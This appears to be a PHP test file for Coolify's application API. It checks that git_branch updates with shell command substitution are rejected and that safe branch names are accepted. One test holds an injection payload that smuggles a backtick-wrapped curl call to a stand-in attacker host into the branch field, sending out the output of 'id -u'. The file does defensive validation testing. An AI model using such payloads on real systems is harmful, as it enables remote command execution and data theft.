<?php

use App\Models\Application;
use App\Models\InstanceSettings;
use App\Models\Project;
use App\Models\Server;
use App\Models\StandaloneDocker;
use App\Models\Team;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Str;
use Visus\Cuid2\Cuid2;

uses(RefreshDatabase::class);

beforeEach(function () {
    InstanceSettings::unguarded(fn () => InstanceSettings::firstOrCreate(['id' => 0]));

    $this->team = Team::factory()->create();
    $this->user = User::factory()->create();
    $this->team->members()->attach($this->user->id, ['role' => 'owner']);
    session(['currentTeam' => $this->team]);

    $plainTextToken = Str::random(40);
    $token = $this->user->tokens()->create([
        'name' => 'git-branch-security-test-'.Str::random(6),
        'token' => hash('sha256', $plainTextToken),
        'abilities' => ['*'],
        'team_id' => $this->team->id,
    ]);
    $this->bearerToken = $token->getKey().'|'.$plainTextToken;

    $this->server = Server::factory()->create(['team_id' => $this->team->id]);

    StandaloneDocker::withoutEvents(function () {
        $this->destination = $this->server->standaloneDockers()->firstOrCreate(
            ['network' => 'coolify'],
            ['uuid' => (string) new Cuid2, 'name' => 'test-docker']
        );
    });

    $this->project = Project::create([
        'uuid' => (string) new Cuid2,
        'name' => 'test-project',
        'team_id' => $this->team->id,
    ]);
    $this->environment = $this->project->environments()->first();
    $this->application = Application::factory()->create([
        'environment_id' => $this->environment->id,
        'destination_id' => $this->destination->id,
        'destination_type' => $this->destination->getMorphClass(),
        'git_branch' => 'main',
    ]);
});

function gitBranchApiHeaders(string $bearerToken): array
{
    return [
        'Authorization' => 'Bearer '.$bearerToken,
        'Content-Type' => 'application/json',
    ];
}

describe('PATCH /api/v1/applications/{uuid} git_branch security', function () {
    test('rejects backtick command substitution branch payloads', function () {
        $payload = 'main`curl${IFS}attacker.test/coolify-rce-`id${IFS}-u``';

        $response = $this->withHeaders(gitBranchApiHeaders($this->bearerToken))
            ->patchJson("/api/v1/applications/{$this->application->uuid}", [
                'git_branch' => $payload,
            ]);

        $response->assertUnprocessable()
            ->assertJsonValidationErrors('git_branch');

        expect($this->application->refresh()->git_branch)->toBe('main');
    });

    test('accepts safe branch names', function () {
        $response = $this->withHeaders(gitBranchApiHeaders($this->bearerToken))
            ->patchJson("/api/v1/applications/{$this->application->uuid}", [
                'git_branch' => 'feature/safe-branch_1.2.3',
            ]);

        $response->assertOk();

        expect($this->application->refresh()->git_branch)->toBe('feature/safe-branch_1.2.3');
    });
});
